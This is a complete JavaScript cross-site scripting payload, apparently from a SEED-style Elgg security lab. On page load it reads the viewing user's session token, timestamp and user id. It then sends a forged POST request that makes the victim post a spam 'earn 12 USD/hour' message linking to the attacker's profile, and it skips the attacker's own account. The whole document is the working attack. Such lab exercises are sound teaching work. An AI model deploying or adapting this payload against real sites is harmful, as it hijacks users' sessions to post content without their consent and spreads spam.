<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var id = elgg.session.user.guid;
	//Construct the content of your url.
	//Got the request URL from inspect mode of the browser.
        var sendurl="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN

	// for changing briefdescription = 1605098 and all other fields with random values and accesslevel = loged in users	
	var content=token + ts + "&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy"; 

//actual request body example got from the "Edit and Resend" option.  
//__elgg_token=wpUu2T2OQWdA_wM3xsfq0w&__elgg_ts=1624532050&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy
//token + ts + "&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy"

	if(id != 47) // skip if the id is Sammy's
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}
</script>
